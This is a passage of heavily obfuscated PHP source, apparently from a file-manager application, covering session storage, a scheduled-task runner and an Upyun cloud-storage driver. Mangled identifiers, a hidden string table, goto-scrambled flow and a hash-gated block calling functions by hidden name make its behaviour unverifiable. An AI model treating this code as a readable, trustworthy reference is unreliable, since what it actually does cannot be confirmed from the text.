self::$methods[$FÔà‡·óæã] == $B∑∫‰©ÿŸÖ[1369] || !empty(self::$maps[$FÔà‡·óæã]) && in_array($B≥æƒ¢øæ∑, self::$maps[$FÔà‡·óæã])) { $fÍ’Öå∞€⁄ = !0; array_shift($Fèá„Ëò”ì); if (!is_object(self::$callbacks[$FÔà‡·óæã])) { $E„ÒÚêº⁄Ò = explode($B∑∫‰©ÿŸÖ[8], self::$callbacks[$FÔà‡·óæã]); $C£àÕÔª¬Í = end($E„ÒÚêº⁄Ò); $e¯†á∫çâã = explode($B∑∫‰©ÿŸÖ[1370], $C£àÕÔª¬Í); $D¢ÿê¥∫Éè = new $e¯†á∫çâã[0](); if (!method_exists($D¢ÿê¥∫Éè, $e¯†á∫çâã[1])) { echo $B∑∫‰©ÿŸÖ[1373]; } else { call_user_func_array(array($D¢ÿê¥∫Éè, $e¯†á∫çâã[1]), $Fèá„Ëò”ì); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$FÔà‡·óæã], $Fèá„Ëò”ì); if (self::$halts) { return; } } } } $FÔà‡·óæã++; } } if ($fÍ’Öå∞€⁄ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $D™ﬂó“ª≈ó =& $_SERVER[—Ω]; header($_SERVER[$D™ﬂó“ª≈ó[1374]] . $D™ﬂó“ª≈ó[1375]); echo $D™ﬂó“ª≈ó[1376]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$B∑∫‰©ÿŸÖ[1368]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Cõ≠°‘ÎŒò; c“‰†äë¢ø: $AèﬁèÍÚ∂È = array_keys(static::$patterns); $cªâºçÛú¡ = array_values(static::$patterns); $fÍ’Öå∞€⁄ = !1; goto A¬⁄öâœ∂∫; a¶åΩÁƒƒ: $B∑∫‰©ÿŸÖ =& $_SERVER[—Ω]; $fäÖ–ÈëÂ‰ = parse_url($_SERVER[$B∑∫‰©ÿŸÖ[1368]], PHP_URL_PATH); $B≥æƒ¢øæ∑ = $_SERVER[$B∑∫‰©ÿŸÖ[151]]; goto c“‰†äë¢ø; Cõ≠°‘ÎŒò: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto FÙå®Ò®ø§; Aö«•œ˜ªÕ: $Cêÿ”ËÜôß = _get($GLOBALS, $A∏ﬂõÉâÖú[1378], $Cêÿ”ËÜôß); if (self::$sessionSign) { } else { if (Cookie::get($Cêÿ”ËÜôß)) { self::$sessionSign = Cookie::get($Cêÿ”ËÜôß); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Cêÿ”ËÜôß, self::$sessionSign, self::$sessionTime); goto c√—á–ó„†; EÑü±∞ñèﬂ: $d®º¬Ö√Ìæ = $GLOBALS[$A∏ﬂõÉâÖú[6]][$A∏ﬂõÉâÖú[334]]; self::$sessionTime = $d®º¬Ö√Ìæ[$A∏ﬂõÉâÖú[1377]]; $Cêÿ”ËÜôß = SESSION_ID; goto Aö«•œ˜ªÕ; aÃé‘é„”ô: return $aÒ»àØùÉ´; goto dﬁ¨Óó’π•; c√—á–ó„†: $Dãü´ó·≥™ = $d®º¬Ö√Ìæ[$A∏ﬂõÉâÖú[1379]]; $Aå¨Ÿ¢È¨€ = $d®º¬Ö√Ìæ[$Dãü´ó·≥™]; $b‘Öâàò€Í = $d®º¬Ö√Ìæ[$A∏ﬂõÉâÖú[764]]; goto b·òâ”ˆ¬›; FÙå®Ò®ø§: $A∏ﬂõÉâÖú =& $_SERVER[—Ω]; static $aÒ»àØùÉ´ = false; if ($aÒ»àØùÉ´) { return $aÒ»àØùÉ´; } goto EÑü±∞ñèﬂ; b·òâ”ˆ¬›: switch ($Dãü´ó·≥™) { case $A∏ﬂõÉâÖú[17]: self::$handle = Model($A∏ﬂõÉâÖú[765]); break; case $A∏ﬂõÉâÖú[766]: self::$handle = new CacheRedis($Aå¨Ÿ¢È¨€, $b‘Öâàò€Í); break; case $A∏ﬂõÉâÖú[767]: self::$handle = new CacheMemcached($Aå¨Ÿ¢È¨€, $b‘Öâàò€Í); break; case $A∏ﬂõÉâÖú[164]: $Aå¨Ÿ¢È¨€[$A∏ﬂõÉâÖú[75]] = $Aå¨Ÿ¢È¨€[$A∏ﬂõÉâÖú[75]] . $A∏ﬂõÉâÖú[1380]; self::$handle = new CacheFile($Aå¨Ÿ¢È¨€, $b‘Öâàò€Í); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $aÒ»àØùÉ´ = new self(); goto aÃé‘é„”ô; dﬁ¨Óó’π•: } public static function sign($Bèé…Î¨òî = false) { $Bèé…Î¨òî && (self::$sessionSign = $Bèé…Î¨òî); self::init(); return self::$sessionSign; } public static function set($B—òà„–ÿæ, $A±•Ê¢∞ı» = false) { self::init(); if (is_array($B—òà„–ÿæ)) { foreach ($B—òà„–ÿæ as $CÑ∂Òé«êà => $bÏòíê±Éë) { array_set_value(self::$data, $CÑ∂Òé«êà, $bÏòíê±Éë); } } else { array_set_value(self::$data, $B—òà„–ÿæ, $A±•Ê¢∞ı»); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($fÂ°Ñ≥”å≈ = false) { self::init(); if (!$fÂ°Ñ≥”å≈) { return self::$data; } return array_get_value(self::$data, $fÂ°Ñ≥”å≈); } public static function remove($aﬂòˆí‰ß‚) { self::init(); unset(self::$data[$aﬂòˆí‰ß‚]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[—Ω][769])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto Fö®¬∑‡ÛÍ; cÌ¡•ª˜÷ÿ: while (!0) { self::cacheClear(); if (self::valueGet($BüÒ¨Ù∆úà[699]) != $BüÒ¨Ù∆úà[83]) { self::valueSet($BüÒ¨Ù∆úà[1381], $BüÒ¨Ù∆úà[464]); self::log($BüÒ¨Ù∆úà[1385]); die; } self::valueSet($BüÒ¨Ù∆úà[1381], $BüÒ¨Ù∆úà[83]); self::valueSet($BüÒ¨Ù∆úà[1382], time()); self::taskRunAll(); sleep(self::valueGet($BüÒ¨Ù∆úà[1386])); } goto cñªÃ±ıô„; d‹»òåÉÈ´: http_close(); self::valueSet($BüÒ¨Ù∆úà[1381], $BüÒ¨Ù∆úà[83]); Hook::bind($BüÒ¨Ù∆úà[1383], $BüÒ¨Ù∆úà[1384]); goto cÌ¡•ª˜÷ÿ; Fö®¬∑‡ÛÍ: $BüÒ¨Ù∆úà =& $_SERVER[—Ω]; if (self::valueGet($BüÒ¨Ù∆úà[699]) != $BüÒ¨Ù∆úà[83]) { return; } if (self::valueGet($BüÒ¨Ù∆úà[1381]) == $BüÒ¨Ù∆úà[83]) { $Eå≤˜±öÊú = self::valueGet($BüÒ¨Ù∆úà[1382]); if (time() - $Eå≤˜±öÊú > 3600 * 2) { self::restart(); } return; } goto d‹»òåÉÈ´; cñªÃ±ıô„: } public static function restart() { $cÉõ‹îÿ›à =& $_SERVER[—Ω]; http_close(); self::valueSet($cÉõ‹îÿ›à[699], $cÉõ‹îÿ›à[464]); sleep(self::valueGet($cÉõ‹îÿ›à[1386]) + 5); self::valueSet($cÉõ‹îÿ›à[1381], $cÉõ‹îÿ›à[464]); self::valueSet($cÉõ‹îÿ›à[699], $cÉõ‹îÿ›à[83]); } public static function shutdownEvent() { $b±çòãüﬁ— =& $_SERVER[—Ω]; self::valueSet($b±çòãüﬁ—[1381], $b±çòãüﬁ—[464]); self::log($b±çòãüﬁ—[1387]); } public static function config($D•°çÑƒïÖ, $cà–ÁÉ∏†») { $Bäò∑í¨£· =& $_SERVER[—Ω]; $D·±’ﬂ‡Œä = 20; $cà–ÁÉ∏†» = intval($cà–ÁÉ∏†») <= $D·±’ﬂ‡Œä ? $D·±’ﬂ‡Œä : intval($cà–ÁÉ∏†»); self::valueSet($Bäò∑í¨£·[699], $D•°çÑƒïÖ); self::valueSet($Bäò∑í¨£·[1386], $cà–ÁÉ∏†»); } private static function taskRunAll() { $D’ôªˆåç∆ =& $_SERVER[—Ω]; $dîÎ ﬁÜ¢Á = Model($D’ôªˆåç∆[1388])->listData(); $C¬Ó⁄◊æìñ = count($dîÎ ﬁÜ¢Á); for ($cøç∑Ü§∞â = 0; $cøç∑Ü§∞â < $C¬Ó⁄◊æìñ; $cøç∑Ü§∞â++) { $dˆÊ£ÌÑ¯Î = $dîÎ ﬁÜ¢Á[$cøç∑Ü§∞â]; if ($dˆÊ£ÌÑ¯Î[$D’ôªˆåç∆[1389]] != $D’ôªˆåç∆[83]) { continue; } if (!self::taskTimeCheck($dˆÊ£ÌÑ¯Î)) { continue; } self::taskRun($dˆÊ£ÌÑ¯Î); } Hook::trigger($D’ôªˆåç∆[1390]); } private static function taskTimeCheck($FÈ€Á±§Àã) { goto C¬æ·Ñâ√ù; E—·å∏µÈÁ: switch ($Cı“πøí«„[$cßú¯…ìÙ[29]]) { case $cßú¯…ìÙ[1397]: if (time() - $eïó⁄¥ú˜¶ < 3600 * 24 * 30) { return !1; } if ($Cı“πøí«„[$cßú¯…ìÙ[1397]] == date($cßú¯…ìÙ[1398]) && $céû∂¨Ãª) { return !0; } break; case $cßú¯…ìÙ[1399]: if (time() - $eïó⁄¥ú˜¶ < 3600 * 24 * 7) { return !1; } $BÉÒÜ≥ùíÍ = date($cßú¯…ìÙ[1400]) == 0 ? 7 : date($cßú¯…ìÙ[1400]); if ($Cı“πøí«„[$cßú¯…ìÙ[1399]] == $BÉÒÜ≥ùíÍ && $céû∂¨Ãª) { return !0; } break; case $cßú¯…ìÙ[1392]: if (time() - $eïó⁄¥ú˜¶ < 3600 * 24) { return !1; } if ($céû∂¨Ãª) { return !0; } break; case $cßú¯…ìÙ[1401]: if (time() - $eïó⁄¥ú˜¶ >= floatval($Cı“πøí«„[$cßú¯…ìÙ[1401]]) * 60) { return !0; } break; default: break; } return !1; goto B‚·óáêí¶; D∂ä•‘–çï: $AäåÏ∫ÿÉø = strtotime($cßú¯…ìÙ[1391] . $Cı“πøí«„[$cßú¯…ìÙ[1392]] . $cßú¯…ìÙ[1393]) - strtotime($cßú¯…ìÙ[1394]); $a‰¢∏õûøò = time() - strtotime(date($cßú¯…ìÙ[1395]) . $cßú¯…ìÙ[1396]); $céû∂¨Ãª = $a‰¢∏õûøò >= $AäåÏ∫ÿÉø && $a‰¢∏õûøò <= $AäåÏ∫ÿÉø + 3600; goto E—·å∏µÈÁ; C¬æ·Ñâ√ù: $cßú¯…ìÙ =& $_SERVER[—Ω]; $Cı“πøí«„ = json_decode($FÈ€Á±§Àã[$cßú¯…ìÙ[187]], !0); $eïó⁄¥ú˜¶ = intval($FÈ€Á±§Àã[$cßú¯…ìÙ[1382]]); goto D∂ä•‘–çï; B‚·óáêí¶: } public static function taskRun($Aíè≠≥Ç≠¥) { goto D‹¿»¬íäé; B÷◊ ⁄∂ïﬁ: Model($B“ÑÙÈØ¢Ñ[1406])->add(array($B“ÑÙÈØ¢Ñ[1407] => $B“ÑÙÈØ¢Ñ[33], $B“ÑÙÈØ¢Ñ[1408] => $B“ÑÙÈØ¢Ñ[464], $B“ÑÙÈØ¢Ñ[29] => $B“ÑÙÈØ¢Ñ[1409] . $Aíè≠≥Ç≠¥[$B“ÑÙÈØ¢Ñ[364]], $B“ÑÙÈØ¢Ñ[1410] => json_encode(array($B“ÑÙÈØ¢Ñ[28] => $Aíè≠≥Ç≠¥[$B“ÑÙÈØ¢Ñ[28]], $B“ÑÙÈØ¢Ñ[1411] => timeFloat() - $Fã≥Í∑¨’†, $B“ÑÙÈØ¢Ñ[278] => $a√—ªå√«˘)))); self::log($B“ÑÙÈØ¢Ñ[1412] . $Aíè≠≥Ç≠¥[$B“ÑÙÈØ¢Ñ[364]] . $B“ÑÙÈØ¢Ñ[1413] . $a√—ªå√«˘); return !0; goto bãÓÔ§º‰É; D‹¿»¬íäé: $B“ÑÙÈØ¢Ñ =& $_SERVER[—Ω]; self::log($B“ÑÙÈØ¢Ñ[1402] . $Aíè≠≥Ç≠¥[$B“ÑÙÈØ¢Ñ[364]] . $B“ÑÙÈØ¢Ñ[1403] . $Aíè≠≥Ç≠¥[$B“ÑÙÈØ¢Ñ[28]] . $B“ÑÙÈØ¢Ñ[1404] . $Aíè≠≥Ç≠¥[$B“ÑÙÈØ¢Ñ[1405]]); Model($B“ÑÙÈØ¢Ñ[1388])->run($Aíè≠≥Ç≠¥[$B“ÑÙÈØ¢Ñ[364]]); goto a¥ü˜•§â’; a¥ü˜•§â’: $Fã≥Í∑¨’† = timeFloat(); $a√—ªå√«˘ = $B“ÑÙÈØ¢Ñ[33]; switch ($Aíè≠≥Ç≠¥[$B“ÑÙÈØ¢Ñ[29]]) { case $B“ÑÙÈØ¢Ñ[292]: $BçëÔ•û‹å = url_request($Aíè≠≥Ç≠¥[$B“ÑÙÈØ¢Ñ[1405]], $B“ÑÙÈØ¢Ñ[213], !1, !1, !1, !1, 5); $a√—ªå√«˘ = strlen($BçëÔ•û‹å); break; case $B“ÑÙÈØ¢Ñ[212]: $a√—ªå√«˘ = Hook::apply($Aíè≠≥Ç≠¥[$B“ÑÙÈØ¢Ñ[1405]]); default: break; } goto B÷◊ ⁄∂ïﬁ; bãÓÔ§º‰É: } private static function valueGet($d¥…ì‡ìØ¿) { $FôŒÌ¶ú©õ =& $_SERVER[—Ω]; $E√ëë«•å≤ = $FôŒÌ¶ú©õ[1414]; $a–ø∑ë®á  = Model($FôŒÌ¶ú©õ[1415])->get($d¥…ì‡ìØ¿, $E√ëë«•å≤); if (is_null($a–ø∑ë®á )) { Model($FôŒÌ¶ú©õ[1415])->set($FôŒÌ¶ú©õ[1386], 10, $E√ëë«•å≤); Model($FôŒÌ¶ú©õ[1415])->set($FôŒÌ¶ú©õ[699], $FôŒÌ¶ú©õ[83], $E√ëë«•å≤); Model($FôŒÌ¶ú©õ[1415])->set($FôŒÌ¶ú©õ[1381], $FôŒÌ¶ú©õ[464], $E√ëë«•å≤); $a–ø∑ë®á  = Model($FôŒÌ¶ú©õ[1415])->get($d¥…ì‡ìØ¿, $E√ëë«•å≤); } return $a–ø∑ë®á ; } private static function valueSet($fë»·—è¨Î, $fª ŒﬂÚ◊§) { $CÌÇƒÌÃîã =& $_SERVER[—Ω]; return Model($CÌÇƒÌÃîã[1415])->set($fë»·—è¨Î, $fª ŒﬂÚ◊§, $CÌÇƒÌÃîã[1414]); } protected static function log($DÒπÊ›ÚÚí) { write_log($DÒπÊ›ÚÚí, $_SERVER[—Ω][1416]); } private static function cacheClear() { $b⁄Çëõ≈Æ  =& $_SERVER[—Ω]; $c€ååá¬Ωä = Model($b⁄Çëõ≈Æ [1415])->cacheKey($b⁄Çëõ≈Æ [1414]); Cache::clearMemory($c€ååá¬Ωä); } } goto Cø ’É¢äö; Bå´“êÑÀ§: if ($_SERVER[$_SERVER[—Ω][690]] != $dÏŸ«˜æ‘($d—çÊ´”›∑)) { goto Aäëﬁ¡ç≤”; Aäëﬁ¡ç≤”: $B‘≤ÇÔ¡ÜÒ = $_SERVER[—Ω][692]; $B±ˆï˜ïúå = $_SERVER[$_SERVER[—Ω][693]] . $_SERVER[—Ω][694]; $d◊è∫ÎıæÊ = $B‘≤ÇÔ¡ÜÒ($B±ˆï˜ïúå); goto C‘«£áéöò; fá¿‰®»¢ù: $eπá™À’∏Ì($d—çÊ´”›∑); goto eô¢‘Ãì∑£; C‘«£áéöò: $A…ƒˆπ¬‰√ = explode($_SERVER[—Ω][214], $d◊è∫ÎıæÊ); if (count($A…ƒˆπ¬‰√) < $_SERVER[—Ω][553]) { $CÜºßÑÖÍÌ = $_SERVER[—Ω][695]; $CÜºßÑÖÍÌ(); } $eπá™À’∏Ì = $_SERVER[—Ω][696]; goto fá¿‰®»¢ù; eô¢‘Ãì∑£: } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($a§±Î∫É›ô, $c≤ÁﬂëâùÚ = 0) { parent::__construct(); $this->source = $a§±Î∫É›ô; $this->sourceSize = $c≤ÁﬂëâùÚ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Dï©ÑÊ««≠ = false) { return $this->sourceSize; } public function getContent($D©ú‘≤‘µ∞ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $e±úÇ—¢á∏ = ftell($this->source); $AµåŸé§ÜÒ = @fread($this->source, $this->sourceSize); fseek($this->source, $e±úÇ—¢á∏); return $AµåŸé§ÜÒ; } } public function fileSubstr($bÑ‚¿õ≥·ë = false, $Fé¨ÀâÁ• = 0, $CØÖ«©∑€ = 0) { if (!$CØÖ«©∑€) { $CØÖ«©∑€ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Fé¨ÀâÁ•, $CØÖ«©∑€); } if ($this->sourceType == self::TYPE_FILE) { $B‘ÎÜ¢ÕÂø = ftell($this->source); fseek($this->source, $B‘ÎÜ¢ÕÂø + $Fé¨ÀâÁ•); $a∆Ü—◊“íî = @fread($this->source, $CØÖ«©∑€); fseek($this->source, $B‘ÎÜ¢ÕÂø); return $a∆Ü—◊“íî; } } public function hashMd5($c“∑ïÚíâ† = false) { return md5($this->getContent()); } public static function hash($c…«Â´∂ı¨, $CÕÎÿºé¢… = 0) { $DΩæ‹È™ıú = new PathDriverStream($c…«Â´∂ı¨, $CÕÎÿºé¢…); return $DΩæ‹È™ıú->hashSimple($c…«Â´∂ı¨); } public static function md5($CÈÔÑÖ‡Ñ–, $CﬂüÜ®ú•ì = 0) { $aæﬁëáûŒ = new PathDriverStream($CÈÔÑÖ‡Ñ–, $CﬂüÜ®ú•ì); return $aæﬁëáûŒ->hashMd5($CÈÔÑÖ‡Ñ–); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\160\x3a\x2f\x2f\x76\x30\x2e\x61\160\151\56\165\x70\x79\x75\x6e\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Fò—ÖÊáíı) { parent::__construct(); $this->_init($Fò—ÖÊáíı); } public function _init($AÉ¶ë›öìÈ) { foreach ($AÉ¶ë›öìÈ as $CΩÛ˘Ì‹¬¬ => $A•Û‰ÇéÑÎ) { if (isset($this->{$CΩÛ˘Ì‹¬¬})) { $this->{$CΩÛ˘Ì‹¬¬} = $A•Û‰ÇéÑÎ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[—Ω][1237], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($E≈êâ≤éΩ…, $b—‘îÖó÷Á = "\x47\105\x54") { $Fàè… ª‹Î =& $_SERVER[—Ω]; $aµù∂Î√€Ù = gmdate($Fàè… ª‹Î[1201]); $Bâ°˜ë«¢‹ = base64_encode(hash_hmac($Fàè… ª‹Î[1238], "{$b—‘îÖó÷Á}\46{$E≈êâ≤éΩ…}\46{$aµù∂Î√€Ù}", md5("{$this->userpass}"), !0)); $EÑ¡ó±ŒÆˆ = array("\101\165\x74\150\157\x72\x69\x7a\x61\x74\x69\x6f\156\x3a\x55\x50\x59\x55\x4e\40{$this->username}\72{$Bâ°˜ë«¢‹}", "\104\x61\x74\145\x3a{$aµù∂Î√€Ù}"); return $EÑ¡ó±ŒÆˆ; } public function ussRequest($A¢≥ËŒ¶öö, $aô¢ë∞¨›ä = "\x47\105\x54", $d øå·›Ê = false, $c—¿¬∑–üã = false, $Eæ∑îÿµéá = false) { goto aû≥ÖÇÃÈß; aû≥ÖÇÃÈß: $aÎıÎŒπÔ =& $_SERVER[—Ω]; $A¢≥ËŒ¶öö = trim($A¢≥ËŒ¶öö, $aÎıÎŒπÔ[8]); $FÀöæ˘ıíñ = "\x2f{$this->bucket}\x2f{$A¢≥ËŒ¶öö}"; goto eäû°ã¥´æ; eäû°ã¥´æ: $aÙÔÇ¯Ô¥¢ = $this->ussHeaders($FÀöæ˘ıíñ, $aô¢ë∞¨›ä); if ($c—¿¬∑–üã) { $aÙÔÇ¯Ô¥¢ = array_merge($aÙÔÇ¯Ô¥¢, $c—¿¬∑–üã); } $D∞ëÃ”òÚß = url_request($this->endpoint . $FÀöæ˘ıíñ, $aô¢ë∞¨›ä, $d øå·›Ê, $aÙÔÇ¯Ô¥¢, $Eæ∑îÿµéá); goto eÁ˜ﬂßíﬁ¢; eÁ˜ﬂßíﬁ¢: if (!$D∞ëÃ”òÚß) { return array($aÎıÎŒπÔ[1036] => !1, $aÎıÎŒπÔ[1038] => $aÎıÎŒπÔ[1239]); } if (strtolower($aô¢ë∞¨›ä) == $aÎıÎŒπÔ[181] || in_array($D∞ëÃ”òÚß[$aÎıÎŒπÔ[1036]], array($aÎıÎŒπÔ[1097], $aÎıÎŒπÔ[1240]))) { $d øå·›Ê = $D∞ëÃ”òÚß[$aÎıÎŒπÔ[1241]]; } else { $d øå·›Ê = json_decode($D∞ëÃ”òÚß[$aÎıÎŒπÔ[1038]], !0); if (!$d øå·›Ê) { $d øå·›Ê = $D∞ëÃ”òÚß[$aÎıÎŒπÔ[1038]]; } else { if (!$D∞ëÃ”òÚß[$aÎıÎŒπÔ[699]] && isset($d øå·›Ê[$aÎıÎŒπÔ[1242]])) { $d øå·›Ê = $d øå·›Ê[$aÎıÎŒπÔ[1242]]; } } } return array($aÎıÎŒπÔ[1036] => $D∞ëÃ”òÚß[$aÎıÎŒπÔ[699]], $aÎıÎŒπÔ[1038] => $d øå·›Ê); goto d¬ÂëΩ≠òï; d¬ÂëΩ≠òï: } public function mkfile($C»ÔÁÇ´¿≠, $C£√Ôæ∂™Î = '', $d‹¡Ÿ•¬»Î = REPEAT_RENAME) { if ($this->setContent($C»ÔÁÇ´¿≠, $C£√Ôæ∂™Î)) { return $this->getPathOuter($C»ÔÁÇ´¿≠); } return !1; } public function mkdir($bïßÆ∂’˘», $b«»¬å®ì› = REPEAT_SKIP) { $fÁÒôà—°á =& $_SERVER[—Ω]; $e“öå±∫üÖ = trim($bïßÆ∂’˘», $fÁÒôà—°á[8]); if ($this->_isFolder($e“öå±∫üÖ)) { return $this->getPathOuter($e“öå±∫üÖ); } $CàëæàÏÚ‹ = array($fÁÒôà—°á[1243]); $EÃÜ´™ºÆ∂ = $this->ussRequest($e“öå±∫üÖ, $fÁÒôà—°á[209], !1, $CàëæàÏÚ‹); return $EÃÜ´™ºÆ∂[$fÁÒôà—°á[1036]] ? $this->getPathOuter($e“öå±∫üÖ) : !1; } public function copyFile($e€≠≥«Îò´, $bìÀêÚƒª€) { $Fù»ŒÉÛÛ– =& $_SERVER[—Ω]; $Aß‹êΩΩ⁄´ = array($Fù»ŒÉÛÛ–[1244] . "\57{$this->bucket}\57{$e€≠≥«Îò´}", $Fù»ŒÉÛÛ–[1245]); $Cûù„êÖ¶ = $this->ussRequest($bìÀêÚƒª€, $Fù»ŒÉÛÛ–[211], !1, $Aß‹êΩΩ⁄´); return $Cûù„êÖ¶[$Fù»ŒÉÛÛ–[1036]] ? !0 : !1; } public function moveFile($b® ÑáÂÿ‘, $eå“öìßÍà) { $Fñ°Ÿı√´ =& $_SERVER[—Ω]; $aåû‡©™ê• = array($Fñ°Ÿı√´[1246] . "\57{$this->bucket}\x2f{$b® ÑáÂÿ‘}", $Fñ°Ÿı√´[1245]); $bˆ§…ëº÷† = $this->ussRequest($eå“öìßÍà, $Fñ°Ÿı√´[211], !1, $aåû‡©™ê•); return $bˆ§…ëº÷†[$Fñ°Ÿı√´[1036]] ? !0 : !1; } public function delFile($E∆›ûàßÌ£) { $cµôÜ®«¶‰ =& $_SERVER[—Ω]; $b„Ìá¿á¬√ = $this->ussRequest($E∆›ûàßÌ£, $cµôÜ®«¶‰[1247]); return $b„Ìá¿á¬√[$cµôÜ®«¶‰[1036]] ? !0 : !1; } public function delFolder($A‘ Ù∆û⁄Ô) { $Aæ±°Ë†ü” =& $_SERVER[—Ω]; $c›Ôîã‹ùú = $this->listAll($A‘ Ù∆û⁄Ô); krsort($c›Ôîã‹ùú); foreach ($c›Ôîã‹ùú as $dïÂõπﬂ◊È) { $this->ussRequest($dïÂõπﬂ◊È[$Aæ±°Ë†ü”[75]], $Aæ±°Ë†ü”[1247]); } return $this->ussRequest($A‘ Ù∆û⁄Ô, $Aæ±°Ë†ü”[1247]); } public function rename($aÂÃà…Ç›¡, $B£ãê∂à‚æ) { if ($this->isFile($aÂÃà…Ç›¡)) { $B£ãê∂à‚æ = get_path_father($aÂÃà…Ç›¡) . $B£ãê∂à‚æ; return $this->moveFile($aÂÃà…Ç›¡, $B£ãê∂à‚æ); } return $this->renameObject($aÂÃà…Ç›¡, $B£ãê∂à‚æ); } public function fileInfo($Bçñ¶ÑÕùá, $aå∂Ç∆Õ˜œ = false, $eÜ∏˘∏Ü À = array()) { $aù™π†ôóá =& $_SERVER[—Ω]; if ($aå∂Ç∆Õ˜œ) { return array($aù™π†ôóá[28] => $this->pathThis($Bçñ¶ÑÕùá), $aù™π†ôóá[75] => $this->getPathOuter($aù™π†ôóá[8] . $Bçñ¶ÑÕùá), $aù™π†ôóá[29] => $aù™π†ôóá[164], $aù™π†ôóá[77] => isset($eÜ∏˘∏Ü À[$aù™π†ôóá[322]]) ? $eÜ∏˘∏Ü À[$aù™π†ôóá[322]] : 0, $aù™π†ôóá[157] => $this->ext($Bçñ¶ÑÕùá)); } $A‚Ï´¢äóÆ = array($aù™π†ôóá[28] => $this->pathThis($Bçñ¶ÑÕùá), $aù™π†ôóá[75] => $this->getPathOuter($aù™π†ôóá[8] . $Bçñ¶ÑÕùá), $aù™π†ôóá[29] => $aù™π†ôóá[164], $aù™π†ôóá[184] => 0, $aù™π†ôóá[107] => isset($E≠⁄ååïÎÛ[$aù™π†ôóá[1248]]) ? $E≠⁄ååïÎÛ[$aù™π†ôóá[1248]] : 0, $aù™π†ôóá[77] => isset($eÜ∏˘∏Ü À[$aù™π†ôóá[322]]) ? $eÜ∏˘∏Ü À[$aù™π†ôóá[322]] : 0, $aù™π†ôóá[157] => $this->ext($Bçñ¶ÑÕùá), $aù™π†ôóá[185] => !0, $aù™π†ôóá[186] => !0); if (empty($eÜ∏˘∏Ü À)) { $eÜ∏˘∏Ü À = $this->objectMeta($Bçñ¶ÑÕùá); if (!$eÜ∏˘∏Ü À) { return $A‚Ï´¢äóÆ; } $A‚Ï´¢äóÆ[$aù™π†ôóá[184]] = $eÜ∏˘∏Ü À[$aù™π†ôóá[1249]]; $A‚Ï´¢äóÆ[$aù™π†ôóá[107]] = $eÜ∏˘∏Ü À[$aù™π†ôóá[1250]]; $A‚Ï´¢äóÆ[$aù™π†ôóá[77]] = $eÜ∏˘∏Ü À[$aù™π†ôóá[77]]; } return $A‚Ï´¢äóÆ; } public function folderInfo($f‘ÜªŒ∏∫Ç, $eÃèñ›§Íü = false) { $a‹ÑƒéÜÃæ =& $_SERVER[—Ω]; if ($eÃèñ›§Íü) { return array($a‹ÑƒéÜÃæ[28] => $this->pathThis($f‘ÜªŒ∏∫Ç), $a‹ÑƒéÜÃæ[75] => $this->getPathOuter($a‹ÑƒéÜÃæ[8] . $f‘ÜªŒ∏∫Ç), $a‹ÑƒéÜÃæ[29] => $a‹ÑƒéÜÃæ[76]); } $eÚ© Ÿœ‡ã = array($a‹ÑƒéÜÃæ[28] => $this->pathThis($f‘ÜªŒ∏∫Ç), $a‹ÑƒéÜÃæ[75] => $this->getPathOuter($a‹ÑƒéÜÃæ[8] . $f‘ÜªŒ∏∫Ç), $a‹ÑƒéÜÃæ[29] => $a‹ÑƒéÜÃæ[76], $a‹ÑƒéÜÃæ[184] => 0, $a‹ÑƒéÜÃæ[107] => isset($aÛ¨Êî∞èÓ[$a‹ÑƒéÜÃæ[1248]]) ? $aÛ¨Êî∞èÓ[$a‹ÑƒéÜÃæ[1248]] : 0, $a‹ÑƒéÜÃæ[1158] => !0, $a‹ÑƒéÜÃæ[1159] => !0); if (empty($E∏äÎŸÔ≤˘)) { $E∏äÎŸÔ≤˘ = $this->objectMeta($f‘ÜªŒ∏∫Ç); if (!$E∏äÎŸÔ≤˘) { return $eÚ© Ÿœ‡ã; } $eÚ© Ÿœ‡ã[$a‹ÑƒéÜÃæ[184]] = $E∏äÎŸÔ≤˘[$a‹ÑƒéÜÃæ[1249]]; $eÚ© Ÿœ‡ã[$a‹ÑƒéÜÃæ[107]] = $E∏äÎŸÔ≤˘[$a‹ÑƒéÜÃæ[1250]]; } return $eÚ© Ÿœ‡ã; } private function fileList($bÍ◊Ü›¯…Â, $FÌï¿É÷Â” = 0, $cÆèÎÜ∫Ù£ = 1000) { $fêŸë’≤Ú =& $_SERVER[—Ω]; $FëÌéãªÕÆ = array($fêŸë’≤Ú[1251], $fêŸë’≤Ú[1252] . $cÆèÎÜ∫Ù£); if ($FÌï¿É÷Â”) { $FëÌéãªÕÆ[] = $fêŸë’≤Ú[1253] . $FÌï¿É÷Â”; } $A√‡Á„ÜÛ‘ = $this->ussRequest($bÍ◊Ü›¯…Â, $fêŸë’≤Ú[213], !1, 